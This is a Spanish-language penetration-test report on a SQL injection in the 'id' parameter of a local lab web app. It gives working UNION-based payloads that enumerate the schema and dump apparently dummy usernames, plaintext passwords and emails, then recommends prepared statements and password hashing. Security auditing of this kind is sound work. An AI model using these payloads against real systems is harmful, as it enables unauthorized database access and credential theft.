# Informe de auditoria SQLi - http://web.dev.local:8083

## Resumen ejecutivo

Se identifico una vulnerabilidad de **SQL Injection** en el parametro `id` enviado por `GET` a `http://web.dev.local:8083/`. La vulnerabilidad es explotable de forma interactiva y automatizada, y permite extraer informacion de la base de datos backend.

**Resultado:** vulnerabilidad confirmada y explotada.  
**Severidad estimada:** Critica.  
**Impacto principal:** lectura arbitraria de datos, enumeracion de base de datos y exposicion de credenciales en claro.

## Superficie afectada

- **URL:** `http://web.dev.local:8083/`
- **Parametro vulnerable:** `id`
- **Metodo:** `GET`

## Evidencia de deteccion

La pagina presenta un formulario `GET` con el campo `id`. El backend concatena ese valor en la consulta SQL sin saneado adecuado.

Confirmacion automatizada con `sqlmap`:

- Tecnicas detectadas sobre `id`:
  - boolean-based blind
  - error-based
  - time-based blind
  - UNION query
- DBMS identificado: **MySQL/MariaDB**
- Stack tecnologico observado: **Apache 2.4.65 / PHP 8.1.33 / Debian Linux**

Payloads validados:

```text
1' UNION ALL SELECT database(),null-- -
1' UNION ALL SELECT user(),null-- -
```

## Evidencia de explotacion

### 1. Extraccion de contexto de base de datos

Payload:

```text
1' UNION ALL SELECT database(),null-- -
```

Respuesta observada:

```text
First name: sqli_demo
```

Payload:

```text
1' UNION ALL SELECT user(),null-- -
```

Respuesta observada:

```text
First name: root@172.18.0.3
```

### 2. Enumeracion de tablas

Payload:

```text
1' UNION ALL SELECT group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()-- -
```

Respuesta observada:

```text
First name: users
```

### 3. Enumeracion de columnas

Payload:

```text
1' UNION ALL SELECT group_concat(column_name),null FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -
```

Respuesta observada:

```text
First name: user_id,first_name,last_name,username,password,email
```

### 4. Extraccion de datos

Payload:

```text
1' UNION ALL SELECT group_concat(user_id,0x3a,username,0x3a,password),null FROM users-- -
```

Respuesta observada:

```text
1:admin:password123
2:jsmith:secret456
3:bjohnson:mypass789
4:awilliams:qwerty123
5:cbrown:password
6:ddavis:secure123
7:emiller:hackme
8:fwilson:admin123
```

Tambien fue posible extraer informacion personal y correos:

```text
1:John:Doe:admin@example.com
2:Jane:Smith:jane@example.com
3:Bob:Johnson:bob@example.com
4:Alice:Williams:alice@example.com
5:Charlie:Brown:charlie@example.com
6:Diana:Davis:diana@example.com
7:Eve:Miller:eve@example.com
8:Frank:Wilson:frank@example.com
```

## Observaciones adicionales

- Al forzar consultas invalidas, la aplicacion devuelve errores detallados de PHP/MySQL, incluyendo rutas internas como `/var/www/html/low.php`, lo que incrementa la exposicion.
- Las contrasenas parecen almacenadas en **texto claro**, agravando significativamente el impacto.

## Impacto

Un atacante autenticado o no autenticado, segun la exposicion del endpoint, podria:

- leer datos arbitrarios de la base de datos;
- enumerar estructura interna de tablas y columnas;
- obtener usuarios y contrasenas;
- facilitar movimientos posteriores contra otros servicios reutilizando credenciales.

## Recomendaciones

1. Sustituir concatenacion SQL por **consultas preparadas** con parametros.
2. Validar `id` estrictamente como entero en servidor.
3. Deshabilitar mensajes de error detallados en produccion.
4. Rotar todas las credenciales expuestas.
5. Almacenar contrasenas con hash robusto (`bcrypt`, `argon2`) y nunca en claro.
6. Revisar el resto de endpoints por patrones similares de inyeccion.

## Conclusion

La aplicacion es vulnerable a **SQL Injection** en el parametro `id`, y la vulnerabilidad fue **explotada con exito** para enumerar la base `sqli_demo` y extraer registros de la tabla `users`, incluyendo credenciales y correos.
